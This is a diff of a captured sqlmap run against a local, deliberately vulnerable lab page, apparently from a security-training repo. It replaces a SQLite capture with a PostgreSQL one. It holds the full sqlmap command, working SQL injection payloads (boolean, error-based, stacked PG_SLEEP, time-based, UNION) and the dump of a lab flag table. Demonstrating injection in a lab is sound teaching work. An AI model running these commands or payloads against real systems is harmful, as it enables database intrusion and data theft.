@@ -3,89 +3,105 @@
 #
 # Command:
 #   sqlmap -u 'http://127.0.0.1:8000/sql-injection/vulnerable/?q=1' \
-#          -p q --batch --level=5 --risk=3 --dump -T sqli_flag
+#          -p q --batch --dump -T sqli_flag
 #
-# Tool: sqlmap 1.10.7  |  Lab DB: SQLite (dev loop)  |  Captured: 2026-07-21
-# Result: the SAME ?q=1 the default run gave up on (sqlmap-default-bail.txt) is
-#         now injectable three ways (boolean-based blind, time-based blind, and
-#         UNION query); the off-limits sqli_flag table is dumped. The only
-#         change from the bail is --level=5 --risk=3.
+# Tool: sqlmap 1.10.7  |  Lab DB: PostgreSQL 16 (docker compose)  |  Captured: 2026-07-22
+# Result: at sqlmap's DEFAULT effort (--level=1 --risk=1) the parameter 'q' is
+#         confirmed injectable four ways - boolean-based blind, error-based,
+#         stacked queries, and time-based blind - and the off-limits sqli_flag
+#         table is dumped. No raised --level/--risk is needed against Postgres.
 #
-# Normalized for this public repo: local output paths -> <output-dir>/<home>,
-# and the local port 8010 -> the documented 8000. Output is otherwise verbatim.
+# Normalized for this public repo: the local --output-dir path -> <output-dir>.
+# Output is otherwise verbatim.
 # ============================================================================
 
         ___
        __H__
- ___ ___[(]_____ ___ ___  {1.10.7#pip}
-|_ -| . [)]     | .'| . |
-|___|_  [)]_|_|_|__,|  _|
+ ___ ___[.]_____ ___ ___  {1.10.7#pip}
+|_ -| . [(]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
       |_|V...       |_|   https://sqlmap.org
 
 [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
 
-[*] starting @ 11:54:55 /2026-07-21/
+[*] starting @ 22:39:21 /2026-07-22/
 
-[11:54:55] [WARNING] using '<output-dir>' as the output directory
-[11:54:55] [INFO] testing connection to the target URL
-[11:54:55] [INFO] checking if the target is protected by some kind of WAF/IPS
-[11:54:55] [INFO] testing if the target URL content is stable
-[11:54:55] [INFO] target URL content is stable
-[11:54:55] [WARNING] heuristic (basic) test shows that GET parameter 'q' might not be injectable
-[11:54:56] [INFO] testing for SQL injection on GET parameter 'q'
-[11:54:56] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[11:54:56] [WARNING] reflective value(s) found and filtering out
-[11:55:00] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
-[11:55:06] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
-[11:55:07] [INFO] GET parameter 'q' appears to be 'OR boolean-based blind - WHERE or HAVING clause (NOT)' injectable (with --string="(no results)")
-[11:55:10] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'SQLite' 
-it looks like the back-end DBMS is 'SQLite'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
-[11:55:10] [INFO] testing 'Generic inline queries'
-[11:55:11] [INFO] testing 'SQLite inline queries'
-[11:55:11] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query - comment)'
-[11:55:11] [INFO] testing 'SQLite > 2.0 stacked queries (heavy query)'
-[11:55:11] [INFO] testing 'SQLite > 2.0 AND time-based blind (heavy query)'
-[11:55:11] [INFO] testing 'SQLite > 2.0 OR time-based blind (heavy query)'
-[11:55:22] [INFO] GET parameter 'q' appears to be 'SQLite > 2.0 OR time-based blind (heavy query)' injectable 
-[11:55:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
-[11:55:22] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
-[11:55:22] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
-[11:55:23] [INFO] target URL appears to have 3 columns in query
-[11:55:23] [INFO] GET parameter 'q' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
-[11:55:23] [WARNING] in OR boolean-based injection cases, please consider usage of switch '--drop-set-cookie' if you experience any problems during data retrieval
+[22:39:21] [WARNING] using '<output-dir>' as the output directory
+[1/1] URL:
+GET http://127.0.0.1:8000/sql-injection/vulnerable/?q=1
+do you want to test this URL? [Y/n/q]
+> Y
+[22:39:21] [INFO] testing URL 'http://127.0.0.1:8000/sql-injection/vulnerable/?q=1'
+[22:39:21] [INFO] using '<output-dir>/results-07222026_1039pm.csv' as the CSV results file in multiple targets mode
+[22:39:21] [INFO] testing connection to the target URL
+[22:39:21] [INFO] checking if the target is protected by some kind of WAF/IPS
+[22:39:21] [INFO] testing if the target URL content is stable
+[22:39:21] [INFO] target URL content is stable
+[22:39:21] [INFO] heuristic (basic) test shows that GET parameter 'q' might be injectable (possible DBMS: 'PostgreSQL')
+[22:39:22] [INFO] testing for SQL injection on GET parameter 'q'
+it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[22:39:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[22:39:22] [WARNING] reflective value(s) found and filtering out
+[22:39:22] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+[22:39:22] [INFO] testing 'Generic inline queries'
+[22:39:22] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
+[22:39:24] [INFO] GET parameter 'q' appears to be 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' injectable (with --code=200)
+[22:39:24] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+[22:39:24] [INFO] GET parameter 'q' is 'PostgreSQL AND error-based - WHERE or HAVING clause' injectable
+[22:39:24] [INFO] testing 'PostgreSQL inline queries'
+[22:39:24] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
+[22:39:34] [INFO] GET parameter 'q' appears to be 'PostgreSQL > 8.1 stacked queries (comment)' injectable
+[22:39:34] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
+[22:39:44] [INFO] GET parameter 'q' appears to be 'PostgreSQL > 8.1 AND time-based blind' injectable
+[22:39:44] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
 GET parameter 'q' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
-sqlmap identified the following injection point(s) with a total of 281 HTTP(s) requests:
+sqlmap identified the following injection point(s) with a total of 53 HTTP(s) requests:
 ---
 Parameter: q (GET)
     Type: boolean-based blind
-    Title: OR boolean-based blind - WHERE or HAVING clause (NOT)
-    Payload: q=1' OR NOT 6636=6636-- dRbP
+    Title: PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)
+    Payload: q=1' AND (SELECT (CASE WHEN (1267=1267) THEN NULL ELSE CAST((CHR(89)||CHR(69)||CHR(100)||CHR(107)) AS NUMERIC) END)) IS NULL-- iJxI
+
+    Type: error-based
+    Title: PostgreSQL AND error-based - WHERE or HAVING clause
+    Payload: q=1' AND 7677=CAST((CHR(113)||CHR(113)||CHR(106)||CHR(113)||CHR(113))||(SELECT (CASE WHEN (7677=7677) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(107)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)-- XUkB
+
+    Type: stacked queries
+    Title: PostgreSQL > 8.1 stacked queries (comment)
+    Payload: q=1';SELECT PG_SLEEP(5)--
 
     Type: time-based blind
-    Title: SQLite > 2.0 OR time-based blind (heavy query)
-    Payload: q=1' OR 3313=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- Verv
-
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 3 columns
-    Payload: q=1' UNION ALL SELECT NULL,CHAR(113,118,113,118,113)||CHAR(118,82,116,83,121,113,72,117,116,97,69,71,110,66,122,79,100,72,77,86,104,112,85,99,80,114,101,75,66,118,105,98,72,70,106,78,73,79,77,108)||CHAR(113,107,120,118,113),NULL-- Snen
+    Title: PostgreSQL > 8.1 AND time-based blind
+    Payload: q=1' AND 4539=(SELECT 4539 FROM PG_SLEEP(5))-- hnyv
 ---
-[11:55:23] [INFO] the back-end DBMS is SQLite
-back-end DBMS: SQLite
-[11:55:23] [INFO] fetching columns for table 'sqli_flag' 
-[11:55:23] [INFO] fetching entries for table 'sqli_flag'
-Database: <current>
+do you want to exploit this SQL injection? [Y/n] Y
+[22:39:45] [INFO] the back-end DBMS is PostgreSQL
+back-end DBMS: PostgreSQL
+[22:39:45] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[22:39:45] [INFO] fetching current database
+[22:39:45] [INFO] retrieved: 'public'
+[22:39:45] [WARNING] on PostgreSQL you'll need to use schema names for enumeration as the counterpart to database names on other DBMSes
+[22:39:45] [INFO] fetching columns for table 'sqli_flag' in database 'public'
+[22:39:45] [INFO] retrieved: 'id'
+[22:39:45] [INFO] retrieved: 'int8'
+[22:39:45] [INFO] retrieved: 'value'
+[22:39:45] [INFO] retrieved: 'varchar'
+[22:39:45] [INFO] fetching entries for table 'sqli_flag' in database 'public'
+[22:39:45] [INFO] retrieved: 'FLAG{sql_injection_via_raw_string_interpolation}'
+[22:39:45] [INFO] retrieved: '1'
+Database: public
 Table: sqli_flag
 [1 entry]
 +----+--------------------------------------------------+
 | id | value                                            |
 +----+--------------------------------------------------+
-| 4  | FLAG{sql_injection_via_raw_string_interpolation} |
+| 1  | FLAG{sql_injection_via_raw_string_interpolation} |
 +----+--------------------------------------------------+
 
-[11:55:23] [INFO] table 'SQLite_masterdb.sqli_flag' dumped to CSV file '<output-dir>\127.0.0.1\dump\SQLite_masterdb\sqli_flag.csv'
-[11:55:23] [WARNING] HTTP error codes detected during run:
-500 (Internal Server Error) - 104 times
-[11:55:23] [INFO] fetched data logged to text files under '<output-dir>\127.0.0.1'
+[22:39:45] [INFO] table 'public.sqli_flag' dumped to CSV file '<output-dir>/127.0.0.1/dump/public/sqli_flag.csv'
+[22:39:45] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 27 times
+[22:39:45] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '<output-dir>/results-07222026_1039pm.csv'
 
-[*] ending @ 11:55:23 /2026-07-21/
-
+[*] ending @ 22:39:45 /2026-07-22/
